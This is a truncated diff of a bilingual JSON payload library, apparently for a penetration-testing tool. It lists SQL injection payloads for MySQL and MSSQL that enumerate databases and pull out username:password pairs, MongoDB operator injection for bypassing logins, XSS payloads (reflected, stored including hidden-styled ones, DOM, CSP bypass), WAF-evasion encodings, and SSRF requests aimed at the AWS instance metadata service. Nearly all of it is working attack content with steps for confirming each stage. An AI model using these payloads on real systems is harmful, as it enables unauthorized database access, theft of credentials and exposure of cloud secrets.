@@ -1,1293 +1,1547 @@
 {
-  "schemaVersion": 1,
-  "entries": [
+ "schemaVersion": 1,
+ "entries": [
+  {
+   "id": "sqli-mysql-basic",
+   "patches": [
     {
-      "id": "sqli-mysql-basic",
-      "patches": [
-        {
-          "area": "execution",
-          "index": 0,
-          "expectedCommand": "' OR '1'='1\n' OR 1=1--\n1' AND '1'='1\n1' AND '1'='2",
-          "description": {
-            "zh": "提交单引号与恒真/恒假布尔条件探测注入点；恒真与恒假两次请求的响应内容或长度出现稳定差异、或单引号触发数据库错误，即可确认注入点可控。",
-            "en": "Submit single quotes plus always-true/always-false boolean conditions to probe the injection point; a stable response or length difference between the true and false pair, or a database error after the quote, confirms a controllable injection point."
-          },
-          "title": {
-            "zh": "探测注入点",
-            "en": "Detect injection point"
-          }
-        },
-        {
-          "area": "execution",
-          "index": 2,
-          "expectedCommand": "' UNION SELECT 1,2,3--\n' UNION SELECT 'a','b','c'--",
-          "description": {
-            "zh": "注入 UNION SELECT 数字与字符序列定位回显位；某个数字或字符出现在页面固定列位置即为回显位，后续数据放到这些列读取。",
-            "en": "Inject UNION SELECT numeric and string sequences to locate reflected columns; a number or character appearing at a fixed page position marks a reflection slot for later extraction."
-          },
-          "title": {
-            "zh": "确定显示位置",
-            "en": "Identify reflected columns"
-          }
-        },
-        {
-          "area": "execution",
-          "index": 3,
-          "expectedCommand": "' UNION SELECT 1,database(),3--\n' UNION SELECT 1,user(),3--\n' UNION SELECT 1,version(),3--\n' UNION SELECT 1,@@hostname,3--",
-          "description": {
-            "zh": "注入 database()/user()/version()/@@hostname 读取基础信息；回显出现当前库名、账户与版本字符串即确认元数据可读。",
-            "en": "Inject database()/user()/version()/@@hostname to read basics; the current database, account, and version appearing in the response confirms readable metadata."
-          },
-          "title": {
-            "zh": "获取数据库信息",
-            "en": "Enumerate database information"
-          }
-        },
-        {
-          "area": "execution",
-          "index": 4,
-          "expectedCommand": "' UNION SELECT 1,group_concat(schema_name),3 FROM information_schema.schemata--\n' UNION SELECT schema_name,2,3 FROM information_schema.schemata LIMIT 0,1--",
-          "description": {
-            "zh": "从 information_schema.schemata 枚举库名；回显出现数据库名列表即确认库清单可枚举。",
-            "en": "Enumerate database names from information_schema.schemata; a list of database names in the response confirms the database inventory is enumerable."
-          },
-          "title": {
-            "zh": "枚举所有数据库",
-            "en": "Enumerate all databases"
-          }
-        },
-        {
-          "area": "execution",
-          "index": 5,
-          "expectedCommand": "' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()--\n' UNION SELECT table_name,2,3 FROM information_schema.tables WHERE table_schema='target_db' LIMIT 0,1--",
-          "description": {
-            "zh": "把 target_db 替换为上一步发现的库名后枚举表名；返回该库全部表名即确认表清单可枚举。",
-            "en": "Replace target_db with a database found in the previous step and enumerate tables; the full table list of that database confirms table enumeration."
-          },
-          "title": {
-            "zh": "枚举表名",
-            "en": "Enumerate Tablesname"
-          }
-        },
-        {
-          "area": "execution",
-          "index": 6,
-          "expectedCommand": "' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='users'--\n' UNION SELECT column_name,2,3 FROM information_schema.columns WHERE table_name='users' AND table_schema=database() LIMIT 0,1--",
-          "description": {
-            "zh": "把 users 替换为目标表名后枚举列名；返回该表全部列名即确认列结构可枚举。",
-            "en": "Replace users with the target table and enumerate columns; the full column list confirms the table structure is enumerable."
-          },
-          "title": {
-            "zh": "枚举列名",
-            "en": "Enumerate Columnsname"
-          }
-        },
-        {
-          "area": "execution",
-          "index": 7,
-          "expectedCommand": "' UNION SELECT 1,group_concat(username,0x3a,password),3 FROM users--\n' UNION SELECT username,password,3 FROM users LIMIT 0,1--",
-          "description": {
-            "zh": "以 0x3a（冒号）拼接 username 与 password 提取数据；回显出现 user:password 形式的凭据即确认数据可批量提取。",
-            "en": "Concatenate username and password with 0x3a (colon) to extract data; user:password pairs in the response confirm bulk data extraction."
-          },
-          "title": {
-            "zh": "提取数据",
-            "en": "Extract Data"
-          }
-        },
-        {
-          "area": "wafBypass",
-          "index": 0,
-          "expectedCommand": "' UnIoN SeLeCt 1,database(),3--\n' uNiOn SeLeCt 1,user(),3--",
-          "description": {
-            "zh": "以大小写混合提交相同 UNION 语句；查询仍执行并返回与基线一致的结果即确认大小写过滤被绕过。",
-            "en": "Resubmit the same UNION with mixed case; the query still executes and returns baseline-consistent results, confirming case filtering is bypassed."
-          }
-        },
-        {
-          "area": "wafBypass",
-          "index": 1,
-          "expectedCommand": "' /*!UNION*/ /*!SELECT*/ 1,database(),3--\n' /*!50000UNION*/ /*!50000SELECT*/ 1,2,3--",
-          "description": {
-            "zh": "用 MySQL 版本注释包裹关键字提交；语句仍执行并返回 database() 结果即确认版本注释绕过有效。",
-            "en": "Wrap keywords in MySQL version comments; the statement still executes and returns database(), confirming the version-comment bypass works."
-          }
-        },
-        {
-          "area": "wafBypass",
-          "index": 2,
-          "expectedCommand": "' UNUNIONION SELSELECTECT 1,database(),3--\n' UNIunionON SELselectECT 1,2,3--",
-          "description": {
-            "zh": "双写关键字提交；过滤器单次替换删除后剩余关键字拼回有效语句并返回相同结果即确认双写绕过有效。",
-            "en": "Submit double-written keywords; after a single-pass replacement filter deletes one copy, the remainder reassembles into a valid statement with identical results, confirming the double-write bypass."
-          }
-        },
-        {
-          "area": "wafBypass",
-          "index": 3,
-          "expectedCommand": "'/**/UNION/**/SELECT/**/1,database(),3--\n' %0aUNION%0aSELECT%0a1,2,3--\n'(UNION(SELECT(1),(database()),(3)))--",
-          "description": {
-            "zh": "用注释、换行、括号替代空格提交；语句仍解析执行并返回相同结果即确认空格过滤被绕过。",
-            "en": "Replace spaces with comments, newlines, or parentheses; the statement still parses and returns identical results, confirming space filtering is bypassed."
-          }
-        },
-        {
-          "area": "wafBypass",
-          "index": 4,
-          "expectedCommand": "' UNION SELECT 1,hex(database()),3--\n' UNION SELECT 1,unhex(hex(database())),3--\n' UNION SELECT 1,conv(hex(database()),16,10),3--",
-          "description": {
-            "zh": "用 hex/unhex/conv 包裹 database() 提交；回显出现十六进制或十进制编码的库名且可还原即确认关键字检测被绕过。",
-            "en": "Wrap database() with hex/unhex/conv; the encoded database name appears in the response and decodes back, confirming keyword detection is bypassed."
-          }
-        },
-        {
-          "area": "execution",
-          "index": 1,
-          "expectedCommand": "' ORDER BY 1--\n' ORDER BY 2--\n' ORDER BY 3--\n' UNION SELECT NULL--\n' UNION SELECT NULL,NULL--\n' UNION SELECT NULL,NULL,NULL--",
-          "title": {
-            "zh": "ORDER BY 列数探测与 UNION NULL 对齐",
-            "en": "Column-count probing via ORDER BY and UNION NULL alignment"
-          }
-        }
-      ]
+     "area": "execution",
+     "index": 0,
+     "expectedCommand": "' OR '1'='1\n' OR 1=1--\n1' AND '1'='1\n1' AND '1'='2",
+     "description": {
+      "zh": "提交单引号与恒真/恒假布尔条件探测注入点；恒真与恒假两次请求的响应内容或长度出现稳定差异、或单引号触发数据库错误，即可确认注入点可控。",
+      "en": "Submit single quotes plus always-true/always-false boolean conditions to probe the injection point; a stable response or length difference between the true and false pair, or a database error after the quote, confirms a controllable injection point."
+     },
+     "title": {
+      "zh": "探测注入点",
+      "en": "Detect injection point"
+     }
     },
     {
-      "id": "sqli-mssql-basic",
-      "patches": [
-        {
-          "area": "execution",
-          "index": 0,
-          "expectedCommand": "' OR 1=1--\n' OR '1'='1\n1' AND 1=1--\n1' AND 1=2--",
-          "description": {
-            "zh": "提交恒真/恒假布尔条件探测注入点；真/假两次请求响应出现稳定差异即确认注入可控。",
-            "en": "Probe the injection point with always-true/always-false boolean conditions; a stable difference between the two responses confirms controllable injection."
-          },
-          "title": {
-            "zh": "探测注入点",
-            "en": "Detect injection point"
-          }
-        },
-        {
-          "area": "execution",
-          "index": 1,
-          "expectedCommand": "' UNION SELECT 1,@@version,3--\n' UNION SELECT 1,SERVERPROPERTY('Edition'),3--\n' UNION SELECT 1,SERVERPROPERTY('ProductVersion'),3--",
-          "description": {
-            "zh": "注入 @@version 与 SERVERPROPERTY 读取版本信息；回显出版本号与 Edition 即确认版本信息可读。",
-            "en": "Inject @@version and SERVERPROPERTY to read version details; version string and Edition in the output confirm readable version metadata."
-          },
-          "title": {
-            "zh": "获取版本信息",
-            "en": "Enumerate version information"
-          }
-        },
-        {
-          "area": "execution",
-          "index": 2,
-          "expectedCommand": "' UNION SELECT 1,user_name(),3--\n' UNION SELECT 1,suser_name(),3--\n' UNION SELECT 1,system_user,3--\n' UNION SELECT 1,is_srvrolemember('sysadmin'),3--",
-          "description": {
-            "zh": "读取当前登录名并检测 sysadmin 角色；回显登录名且 is_srvrolemember('sysadmin') 为 1 即确认高权限上下文。",
-            "en": "Read the current login and test the sysadmin role; the login reflected with is_srvrolemember('sysadmin') = 1 confirms a high-privilege context."
-          },
-          "title": {
-            "zh": "获取用户信息",
-            "en": "Enumerate user information"
-          }
-        },
-        {
-          "area": "execution",
-          "index": 3,
-          "expectedCommand": "' UNION SELECT 1,db_name(),3--\n' UNION SELECT 1,db_name(0),3--\n' UNION SELECT 1,db_name(1),3--\n' UNION SELECT name,2,3 FROM master..sysdatabases--",
-          "description": {
-            "zh": "以 db_name(n) 与 sysdatabases 枚举数据库；返回库名清单即确认库枚举可用。",
-            "en": "Enumerate databases via db_name(n) and sysdatabases; the returned database list confirms database enumeration."
-          },
-          "title": {
-            "zh": "获取数据库信息",
-            "en": "Enumerate database information"
-          }
-        },
-        {
-          "area": "execution",
-          "index": 4,
-          "expectedCommand": "' UNION SELECT 1,name,3 FROM sysobjects WHERE xtype='U'--\n' UNION SELECT 1,name,3 FROM sys.tables--\n' UNION SELECT 1,table_name,3 FROM information_schema.tables--",
-          "description": {
-            "zh": "从 sysobjects/sys.tables/information_schema 枚举用户表；返回用户表名清单即确认表枚举可用。",
-            "en": "Enumerate user tables from sysobjects/sys.tables/information_schema; the returned table list confirms table enumeration."
-          },
-          "title": {
-            "zh": "获取表名",
-            "en": "Enumerate table names"
-          }
-        },
-        {
-          "area": "execution",
-          "index": 5,
-          "expectedCommand": "' UNION SELECT 1,name,3 FROM syscolumns WHERE id=(SELECT id FROM sysobjects WHERE name='users')--\n' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users'--",
-          "description": {
-            "zh": "把 users 替换为目标表名后枚举列名；返回该表列名清单即确认列枚举可用。",
-            "en": "Replace users with the target table and enumerate columns; the returned column list confirms column enumeration."
-          },
-          "title": {
-            "zh": "获取列名",
-            "en": "Enumerate column names"
-          }
-        },
-        {
-          "area": "execution",
-          "index": 6,
-          "expectedCommand": "' UNION SELECT 1,username+':'+password,3 FROM users--\n' UNION SELECT TOP 1 username,password,3 FROM users--",
-          "description": {
-            "zh": "以 + 拼接 username 与 password 提取数据；回显出现 username:password 形式的凭据即确认数据可提取。",
-            "en": "Extract data by concatenating username and password with +; username:password pairs in the response confirm data extraction."
-          },
-          "title": {
-            "zh": "提取数据",
-            "en": "Extract Data"
-          }
-        },
-        {
-          "area": "wafBypass",
-          "index": 0,
-          "expectedCommand": "' UNION SELECT 1,master.dbo.fn_varbintohexstr(CAST(username AS VARBINARY)),3 FROM users--",
-          "description": {
-            "zh": "以 Hex 编码读取 username 提交；回显为十六进制串且可解码还原即确认编码读取可用、关键字检测被绕过。",
-            "en": "Read username as hex encoding; a decodable hex string in the response confirms encoded reads work and keyword detection is bypassed."
-          }
-        },
-        {
-          "area": "wafBypass",
-          "index": 1,
-          "expectedCommand": "'/**/UNION/**/SELECT/**/1,2,3--\n' UN%00ION SELECT 1,2,3--",
-          "description": {
-            "zh": "以注释分词与空字节变体提交 UNION；语句仍执行并返回相同结果即确认注释/空字节绕过有效。",
-            "en": "Resubmit UNION with comment tokenization and null-byte variants; the statement still executes with identical results, confirming the comment/null-byte bypass."
-          }
-        }
-      ]
+     "area": "execution",
+     "index": 2,
+     "expectedCommand": "' UNION SELECT 1,2,3--\n' UNION SELECT 'a','b','c'--",
+     "description": {
+      "zh": "注入 UNION SELECT 数字与字符序列定位回显位；某个数字或字符出现在页面固定列位置即为回显位，后续数据放到这些列读取。",
+      "en": "Inject UNION SELECT numeric and string sequences to locate reflected columns; a number or character appearing at a fixed page position marks a reflection slot for later extraction."
+     },
+     "title": {
+      "zh": "确定显示位置",
+      "en": "Identify reflected columns"
+     }
     },
     {
-      "id": "sqli-mongodb-basic",
-      "patches": [
-        {
-          "area": "execution",
-          "index": 0,
-          "expectedCommand": "{\"username\": \"admin\", \"password\": \"password\"}\n{\"username\": \"admin\", \"password\": {\"$ne\": \"\"}}\n{\"username\": \"admin\", \"password\": {\"$gt\": \"\"}}",
-          "description": {
-            "zh": "提交明文凭据与 $ne/$gt 操作符变体探测注入；操作符版本返回登录成功或查询结果改变即确认查询结构可被操作符改写。",
-            "en": "Submit plaintext credentials alongside $ne/$gt operator variants; a successful login or changed query result from the operator versions confirms operator-rewritable query structure."
-          },
-          "title": {
-            "zh": "探测注入点",
-            "en": "Detect injection point"
-          }
-        },
-        {
-          "area": "execution",
-          "index": 1,
-          "expectedCommand": "{\"username\": \"admin\", \"password\": {\"$ne\": \"wrongpass\"}}\n{\"username\": {\"$ne\": \"\"}, \"password\": {\"$ne\": \"\"}}",
-          "description": {
-            "zh": "提交 $ne/$gt 恒真条件绕过密码比对；返回认证通过即确认登录逻辑可被 NoSQL 操作符绕过。",
-            "en": "Submit always-true $ne/$gt conditions to bypass password comparison; an authenticated result confirms the login logic is bypassable with NoSQL operators."
-          },
-          "title": {
-            "zh": "绕过认证",
-            "en": "Bypass authentication"
-          }
-        },
-        {
-          "area": "execution",
-          "index": 2,
-          "expectedCommand": "{\"username\": \"admin\", \"$or\": [{\"password\": \"realpass\"}, {\"password\": {\"$ne\": \"\"}}]}",
-          "description": {
-            "zh": "用 $or 组合恒真条件注入；返回结果集扩大或认证通过即确认逻辑运算可注入。",
-            "en": "Inject always-true $or combinations; an enlarged result set or successful authentication confirms logical-operator injection."
-          },
-          "title": {
-            "zh": "逻辑运算注入",
-            "en": "Logical operator injection"
-          }
-        },
-        {
-          "area": "execution",
-          "index": 3,
-          "expectedCommand": "{\"username\": {\"$regex\": \"^admin\"}, \"password\": {\"$ne\": \"\"}}",
-          "description": {
-            "zh": "以 $regex 前缀正则探测用户名；前缀命中与未命中时响应不同即确认正则注入可逐字符枚举。",
-            "en": "Probe usernames with $regex prefix patterns; differing responses between matching and non-matching prefixes confirm regex injection enables character-by-character enumeration."
-          },
-          "title": {
-            "zh": "正则注入",
-            "en": "Regex injection"
-          }
-        },
-        {
-          "area": "execution",
-          "index": 4,
-          "expectedCommand": "{\"$where\": \"this.username == 'admin' && this.password.match(/.*/)\"}",
-          "description": {
-            "zh": "注入 $where JavaScript 条件；查询按脚本逻辑返回结果即确认服务端 JS 执行可注入。",
-            "en": "Inject $where JavaScript conditions; results following the script logic confirm injectable server-side JS execution."
-          },
-          "title": {
-            "zh": "$where注入",
-            "en": "$where injection"
-          }
-        },
-        {
-          "area": "execution",
-          "index": 5,
-          "expectedCommand": "{\"username\": {\"$regex\": \"^a\"}}\n{\"username\": {\"$regex\": \"^ad\"}}\n{\"username\": {\"$regex\": \"^adm\"}}",
-          "title": {
-            "zh": "用户名前缀逐字符枚举（$regex）",
-            "en": "Character-by-character username prefix enumeration ($regex)"
-          }
-        }
-      ]
+     "area": "execution",
+     "index": 3,
+     "expectedCommand": "' UNION SELECT 1,database(),3--\n' UNION SELECT 1,user(),3--\n' UNION SELECT 1,version(),3--\n' UNION SELECT 1,@@hostname,3--",
+     "description": {
+      "zh": "注入 database()/user()/version()/@@hostname 读取基础信息；回显出现当前库名、账户与版本字符串即确认元数据可读。",
+      "en": "Inject database()/user()/version()/@@hostname to read basics; the current database, account, and version appearing in the response confirms readable metadata."
+     },
+     "title": {
+      "zh": "获取数据库信息",
+      "en": "Enumerate database information"
+     }
     },
     {
-      "id": "xss-reflected",
-      "patches": [
-        {
-          "area": "execution",
-          "index": 0,
-          "expectedCommand": "<script>alert(1)</script>\n<img src=x onerror=alert(1)>\n<svg onload=alert(1)>\n\" onfocus=alert(1) autofocus \"",
-          "description": {
-            "zh": "提交基础脚本与事件载荷探测输出边界；alert 弹出或载荷原样出现在响应中即确认反射点可控。",
-            "en": "Submit basic script and event payloads to probe the output boundary; an alert firing or the payload reflected verbatim confirms a controllable reflection point."
-          },
-          "title": {
-            "zh": "探测XSS注入点",
-            "en": "Validation step 1 for Reflected XSS Output Boundary"
-          }
-        },
-        {
-          "area": "execution",
-          "index": 1,
-          "expectedCommand": "<img src=x onerror=alert(1)>\n<body onload=alert(1)>\n<input onfocus=alert(1) autofocus>\n<marquee onstart=alert(1)>\n<video><source onerror=alert(1)>\n<audio src=x onerror=alert(1)>",
-          "description": {
-            "zh": "逐行测试不同标签上的事件处理器；任一行触发 alert 即确认对应事件形式未被过滤。",
-            "en": "Test event handlers across different tags line by line; any line firing an alert confirms that event form is unfiltered."
-          },
-          "title": {
-            "zh": "事件处理器绕过",
-            "en": "Validation step 2 for Reflected XSS Output Boundary"
-          }
-        },
-        {
-          "area": "execution",
-          "index": 2,
-          "expectedCommand": "<ScRiPt>alert(1)</ScRiPt>\n<IMG SRC=x OnErRoR=alert(1)>\n<svg/onload=alert(1)>\n<details/open/ontoggle=alert(1)>",
-          "description": {
-            "zh": "以大小写混淆与标签变形提交；仍触发执行即确认过滤对大小写与标签形态不敏感。",
-            "en": "Submit case-obfuscated and tag-mutated payloads; execution still firing confirms the filter is insensitive to case and tag form."
-          },
-          "title": {
-            "zh": "标签绕过",
-            "en": "Validation step 3 for Reflected XSS Output Boundary"
-          }
-        },
-        {
-          "area": "wafBypass",
-          "index": 0,
-          "expectedCommand": "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>\n<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;(1)>",
-          "description": {
-            "zh": "以 HTML 实体编码 alert 提交；解码后仍执行即确认实体编码可绕过关键字过滤。",
-            "en": "Submit entity-encoded alert payloads; execution after decoding confirms HTML-entity encoding bypasses keyword filtering."
-          }
-        },
-        {
-          "area": "wafBypass",
-          "index": 1,
-          "expectedCommand": "<script>\\u0061lert(1)</script>\n<img src=x onerror=\\u0061lert(1)>",
-          "description": {
-            "zh": "以 \\u0061 转义书写 alert 提交；JS 解码后仍执行即确认 Unicode 转义可绕过关键字过滤。",
-            "en": "Write alert with \\u0061 escapes; execution after JS decoding confirms Unicode escapes bypass keyword filtering."
-          }
-        },
-        {
-          "area": "wafBypass",
-          "index": 2,
-          "expectedCommand": "<scr<script>ipt>alert(1)</scr</script>ipt>\n<imimgg src=x onerror=alert(1)>",
-          "description": {
-            "zh": "双写标签提交；过滤器删除内层后拼回有效标签并执行即确认关键字删除过滤可绕过。",
-            "en": "Submit double-written tags; the filter deleting the inner tag and the remainder reassembling into a working tag confirms keyword-deletion filtering is bypassable."
-          }
-        },
-        {
-          "area": "wafBypass",
-          "index": 3,
-          "expectedCommand": "<script>/**/alert(1)/**/</script>\n<img src=x/**/onerror=alert(1)>\n<svg on<!--test-->load=alert(1)>",
-          "description": {
-            "zh": "以注释插入拆分关键字与属性提交；仍触发执行即确认注释混淆可绕过检测。",
-            "en": "Split keywords and attributes with inserted comments; execution still firing confirms comment obfuscation evades detection."
-          }
-        }
-      ]
+     "area": "execution",
+     "index": 4,
+     "expectedCommand": "' UNION SELECT 1,group_concat(schema_name),3 FROM information_schema.schemata--\n' UNION SELECT schema_name,2,3 FROM information_schema.schemata LIMIT 0,1--",
+     "description": {
+      "zh": "从 information_schema.schemata 枚举库名；回显出现数据库名列表即确认库清单可枚举。",
+      "en": "Enumerate database names from information_schema.schemata; a list of database names in the response confirms the database inventory is enumerable."
+     },
+     "title": {
+      "zh": "枚举所有数据库",
+      "en": "Enumerate all databases"
+     }
     },
     {
-      "id": "xss-stored",
-      "patches": [
-        {
-          "area": "execution",
-          "index": 1,
-          "expectedCommand": "<img src=x onerror=alert(1) style=\"display:none\">\n<svg/onload=alert(1) style=\"position:absolute;left:-9999px\">\n<div style=\"background:url(javascript:alert(1))\">",
-          "description": {
-            "zh": "以隐藏样式的事件载荷注入存储点；查看页静默触发执行即确认隐蔽形态可绕过目视检查。",
-            "en": "Inject event payloads with hidden styling into the storage point; silent execution on the viewing page confirms stealthy forms evade visual inspection."
-          },
-          "title": {
-            "zh": "隐蔽Payload",
-            "en": "Stealthy Payload"
-          }
-        },
-        {
-          "area": "wafBypass",
-          "index": 0,
-          "expectedCommand": "<svg><script>alert(1)</script></svg>\n<svg><animate onbegin=alert(1)>\n<svg><set onbegin=alert(1)>",
-          "description": {
-            "zh": "以 SVG script/animate/set 标签提交；仍触发执行即确认 SVG 标签绕过有效。",
-            "en": "Submit SVG script/animate/set tags; execution still firing confirms the SVG-tag bypass."
-          }
-        },
-        {
-          "area": "execution",
-          "index": 0,
-          "expectedCommand": "<script>alert(1)</script>\n\"><script>alert(1)</script>",
-          "title": {
-            "zh": "存储点直注与闭合标签",
-            "en": "Direct stored-point injection and tag closure"
-          }
-        }
-      ]
+     "area": "execution",
+     "index": 5,
+     "expectedCommand": "' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()--\n' UNION SELECT table_name,2,3 FROM information_schema.tables WHERE table_schema='target_db' LIMIT 0,1--",
+     "description": {
+      "zh": "把 target_db 替换为上一步发现的库名后枚举表名；返回该库全部表名即确认表清单可枚举。",
+      "en": "Replace target_db with a database found in the previous step and enumerate tables; the full table list of that database confirms table enumeration."
+     },
+     "title": {
+      "zh": "枚举表名",
+      "en": "Enumerate Tablesname"
+     }
     },
     {
-      "id": "xss-dom",
-      "patches": [
-        {
-          "area": "execution",
-          "index": 1,
-          "expectedCommand": "document.write(location.hash)\ninnerHTML = location.search\neval(location.hash)\nsetTimeout(location.hash, 0)\njQuery(html)\n$(location.hash)",
-          "description": {
-            "zh": "对照常见 DOM Sink（document.write、innerHTML、eval、setTimeout、jQuery html）观察源数据写入后的行为；任一 Sink 触发执行即确认对应数据流可达。",
-            "en": "Watch behavior after source data is written to common DOM sinks (document.write, innerHTML, eval, setTimeout, jQuery html); any sink firing confirms that data flow is reachable."
-          },
-          "title": {
-            "zh": "常见Sink点",
-            "en": "common Sinkpoint"
-          }
-        },
-        {
-          "area": "wafBypass",
-          "index": 0,
-          "expectedCommand": "javascript:alert(1)\njavascript\t:alert(1)\njaVaScRiPt:alert(1)\n&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;:alert(1)\n<a href=\"&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;:alert(1)\">click</a>",
-          "description": {
-            "zh": "以大小写混淆、HTML 实体编码、制表符插入等变体绕过 javascript: 协议过滤；过滤后仍可导航执行即确认协议过滤可绕过。",
-            "en": "Bypass javascript: scheme filtering with case obfuscation, HTML-entity encoding, and tab insertion; navigation/execution surviving the filter confirms the scheme filter is bypassable."
-          }
-        },
-        {
-          "area": "wafBypass",
-          "index": 1,
-          "expectedCommand": "<svg onload=alert(1)>\n<svg/onload=alert(1)>\n<math><mtext><table><mglyph><svg><mtext><textarea><path id=\"</textarea><img onerror=alert(1) src=1>\">\n<details open ontoggle=alert(1)>\n<body onpageshow=alert(1)>\n<input onfocus=alert(1) autofocus>",
-          "description": {
-            "zh": "利用 SVG、MathML 等非标准标签与 ontoggle/onpageshow 等冷门事件绕过黑名单；载荷仍触发执行即确认标签与事件黑名单覆盖不全。",
-            "en": "Evade blacklists with SVG/MathML tags and rare events like ontoggle/onpageshow; payloads still firing confirm the tag and event blacklists have gaps."
-          }
-        },
-        {
-          "area": "execution",
-          "index": 0,
-          "expectedCommand": "#<script>alert(1)</script>\n?param=<img src=x onerror=alert(1)>",
-          "title": {
-            "zh": "Hash 与查询参数源注入",
-            "en": "Hash and query-string source injection"
-          }
-        },
-        {
-          "area": "execution",
-          "index": 3,
-          "expectedCommand": "window.addEventListener(\"message\", function(e){\ndocument.getElementById(\"output\").innerHTML = e.data;\n});\ntargetWindow.postMessage(\"<img src=x onerror=alert(1)>\", \"*\");",
-          "title": {
-            "zh": "postMessage 源注入",
-            "en": "postMessage source injection"
-          }
-        }
-      ]
+     "area": "execution",
+     "index": 6,
+     "expectedCommand": "' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='users'--\n' UNION SELECT column_name,2,3 FROM information_schema.columns WHERE table_name='users' AND table_schema=database() LIMIT 0,1--",
+     "description": {
+      "zh": "把 users 替换为目标表名后枚举列名；返回该表全部列名即确认列结构可枚举。",
+      "en": "Replace users with the target table and enumerate columns; the full column list confirms the table structure is enumerable."
+     },
+     "title": {
+      "zh": "枚举列名",
+      "en": "Enumerate Columnsname"
+     }
     },
     {
-      "id": "xss-csp-bypass",
-      "patches": [
-        {
-          "area": "execution",
-          "index": 1,
-          "expectedCommand": "<script>alert(1)</script>",
-          "description": {
-            "zh": "在允许 unsafe-inline 的 CSP 下直接内联执行脚本；alert 弹出即确认宽松策略可被直接利用。",
-            "en": "Run an inline script under a CSP allowing unsafe-inline; the alert firing confirms permissive policy is directly exploitable."
-          },
-          "title": {
-            "zh": "unsafe-inline 直注验证",
-            "en": "unsafe-inline direct injection check"
-          }
-        },
-        {
-          "area": "execution",
-          "index": 3,
-          "expectedCommand": "<script src=\"https://allowed-domain.com/jsonp?callback=alert(1)\"></script>",
-          "description": {
-            "zh": "借助白名单域上的 JSONP 端点把回调名设为 alert(1)；响应作为脚本执行并弹出即确认 JSONP 信任边界可滥用。allowed-domain.com 替换为目标 CSP 实际允许的域。",
-            "en": "Use a JSONP endpoint on an allowlisted domain with the callback set to alert(1); the response executing as a script confirms JSONP trust-boundary abuse. Replace allowed-domain.com with a domain actually allowed by the target CSP."
-          },
-          "title": {
-            "zh": "白名单域 JSONP 回调执行",
-            "en": "JSONP callback execution on an allowlisted domain"
-          }
-        },
-        {
-          "area": "execution",
-          "index": 0,
-          "expectedCommand": "Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.example.com",
-          "title": {
-            "zh": "样例 CSP 响应头基线",
-            "en": "Sample CSP response header baseline"
-          }
-        },
-        {
-          "area": "execution",
-          "index": 2,
-          "expectedCommand": "<script>eval(\"alert(1)\")</script>\n<script>setTimeout(\"alert(1)\", 0)</script>",
-          "title": {
-            "zh": "unsafe-eval 求值验证",
-            "en": "unsafe-eval evaluation check"
-          }
-        },
-        {
-          "area": "execution",
-          "index": 4,
-          "expectedCommand": "<div ng-app ng-csp>\n<div ng-focus=\"$event.path|orderBy:'[].constructor.from([alert(1)])'\" tabindex=0>\n</div>\n</div>",
-          "title": {
-            "zh": "Angular ng-csp 表达式执行",
-            "en": "Angular ng-csp expression execution"
-          }
-        }
-      ]
+     "area": "execution",
+     "index": 7,
+     "expectedCommand": "' UNION SELECT 1,group_concat(username,0x3a,password),3 FROM users--\n' UNION SELECT username,password,3 FROM users LIMIT 0,1--",
+     "description": {
+      "zh": "以 0x3a（冒号）拼接 username 与 password 提取数据；回显出现 user:password 形式的凭据即确认数据可批量提取。",
+      "en": "Concatenate username and password with 0x3a (colon) to extract data; user:password pairs in the response confirm bulk data extraction."
+     },
+     "title": {
+      "zh": "提取数据",
+      "en": "Extract Data"
+     }
     },
     {
-      "id": "ssrf-cloud-aws",
-      "patches": [
-        {
-          "area": "execution",
-          "index": 0,
-          "expectedCommand": "http://169.254.169.254/latest/meta-data/\nhttp://169.254.169.254/latest/user-data/\nhttp://169.254.169.254/latest/dynamic/instance-identity/",
-          "description": {
-            "zh": "逐条经 SSRF 注入点访问 AWS IMDS 路径；返回元数据目录或字段（如 instance-id）即确认 IMDS 可达。",
-            "en": "Access AWS IMDS paths through the SSRF injection point; a returned metadata directory or fields (such as instance-id) confirm IMDS reachability."
-          },
-          "title": {
-            "zh": "访问元数据服务",
-            "en": "Access Element Data Service"
-          }
-        },
-        {
-          "area": "execution",
-          "index": 2,
-          "expectedCommand": "http://169.254.169.254/latest/user-data/",
-          "description": {
-            "zh": "读取 user-data 启动脚本；返回明文启动脚本即确认实例自定义数据可被读取，注意其中可能包含密钥。",
-            "en": "Read user-data startup scripts; plaintext returned confirms instance custom data is readable and may contain secrets."
-          }
-        },
-        {
-          "area": "execution",
-          "index": 3,
-          "expectedCommand": "1. PAYLOADER_LABtoken:\nPUT http://169.254.169.254/latest/api/token\nHeader: X-aws-ec2-metadata-token-ttl-seconds: 21600\n2. PAYLOADER_LABtokenPAYLOADER_LAB:\nHeader: X-aws-ec2-metadata-token: TOKEN",
-          "description": {
-            "zh": "先 PUT 获取 IMDSv2 token，再携带 token 请求头读取元数据；第一步取得带 TTL 的 token 且第二步返回元数据，即确认 v2 流程可被 SSRF 复现。",
-            "en": "PUT to obtain an IMDSv2 token, then read metadata with the token header; obtaining a TTL-bearing token and then metadata confirms the v2 flow can be replayed through SSRF."
-          }
-        },
-        {
-          "area": "wafBypass",
-          "index": 0,
-          "expectedCommand": "http://2852039166/latest/meta-data/\nhttp://0xA9FEA9FE/latest/meta-data/\nhttp://0251.0376.0251.0376/latest/meta-data/\nhttp://[::ffff:169.254.169.254]/latest/meta-data/\nhttp://0xA9.0376.169.0xFE/latest/meta-data/",
-          "description": {
-            "zh": "逐条提交 IMDS 地址的整数、十六进制与 IPv6 映射变体；任一变体返回元数据而标准地址被拦截，即确认过滤只匹配字符串形式。",
-            "en": "Submit integer, hex, and IPv6-mapped IMDS address variants; any variant returning metadata while the literal form is blocked confirms string-only filtering."
-          }
-        }
-      ]
+     "area": "wafBypass",
+     "index": 0,
+     "expectedCommand": "' UnIoN SeLeCt 1,database(),3--\n' uNiOn SeLeCt 1,user(),3--",
+     "description": {
